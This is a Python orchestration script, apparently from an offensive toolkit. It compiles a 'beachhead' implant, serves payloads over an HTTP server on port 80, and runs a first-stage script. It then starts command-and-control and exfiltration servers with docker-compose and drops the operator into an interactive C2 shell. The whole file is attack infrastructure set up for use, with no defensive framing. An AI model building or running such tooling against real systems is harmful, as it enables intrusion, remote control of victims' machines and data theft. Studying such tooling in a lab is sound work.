import subprocess
import sys
import time

# CONFIGURATION
HTTP_SERVER_PORT = 80
FIRST_STAGE_SCRIPT = 'first_stage.py'
BEACHHEAD_DIR = 'beachhead'

# Compile beachhead
print(f"Compiling {BEACHHEAD_DIR}...")
try:
    subprocess.run(['make'], cwd=BEACHHEAD_DIR, check=True)
    print(f"{BEACHHEAD_DIR} compiled successfully")
except subprocess.CalledProcessError as e:
    print(f"Error compiling {BEACHHEAD_DIR}: {e}")
    sys.exit(1)
except FileNotFoundError:
    print(f"Error: 'make' command not found")
    sys.exit(1)

time.sleep(1)

# Start the HTTP server
print(f"Starting HTTP server on port {HTTP_SERVER_PORT}...")
try:
    http_server = subprocess.Popen([sys.executable, '-m', 'http.server', str(HTTP_SERVER_PORT)])
    print(f"HTTP server started (PID: {http_server.pid})")
except Exception as e:
    print(f"Error starting HTTP server: {e}")
    sys.exit(1)

time.sleep(1)

# Run first stage script
print(f"Running {FIRST_STAGE_SCRIPT}...")
try:
    first_stage = subprocess.run([sys.executable, FIRST_STAGE_SCRIPT], check=True)
    print(f"{FIRST_STAGE_SCRIPT} completed successfully")
except subprocess.CalledProcessError as e:
    print(f"Error running {FIRST_STAGE_SCRIPT}: {e}")
    sys.exit(1)
except FileNotFoundError:
    print(f"Error: Could not find '{FIRST_STAGE_SCRIPT}'")
    sys.exit(1)

# Ensure c2_outputs.txt exists before starting docker-compose
open('c2_outputs.txt', 'a').close()

# Start C2 and exfil servers using docker-compose
print("\n--- Starting C2 and exfil servers with docker-compose ---")
try:
    # Start services in detached mode
    subprocess.run(['docker-compose', 'up', '--build', '-d'], check=True)
    print("C2 and exfil servers are starting...")
    time.sleep(10) # Give some time for containers to be up and running

    # Check the status of the containers
    print("\n--- Checking container status ---")
    subprocess.run(['docker-compose', 'ps'])

    # Find the container ID for the c2-server
    result = subprocess.run(['docker-compose', 'ps', '-q', 'c2-server'], capture_output=True, text=True)
    c2_container_id = result.stdout.strip()

    if not c2_container_id:
        print("\nError: Could not find the c2-server container.")
        print("--- Displaying docker-compose logs for debugging ---")
        subprocess.run(['docker-compose', 'logs'])
        subprocess.run(['docker-compose', 'down'])
        sys.exit(1)

    print(f"\n--- Attaching to C2 server ({c2_container_id}) ---")
    print("You can now type commands below.")
    print("To detach from the container, press Ctrl+P, then Ctrl+Q.")
    
    # Attach to the c2-server container for interactive commands
    subprocess.run(['docker', 'attach', c2_container_id])

except subprocess.CalledProcessError as e:
    print(f"Error with docker-compose: {e}")
except FileNotFoundError:
    print("Error: 'docker-compose' or 'docker' command not found. Please ensure Docker is installed and in your PATH.")
except KeyboardInterrupt:
    print("\nDetaching from C2 server...")
finally:
    print("\nShutting down servers...")
    subprocess.run(['docker-compose', 'down'])
    print("Clean exit.")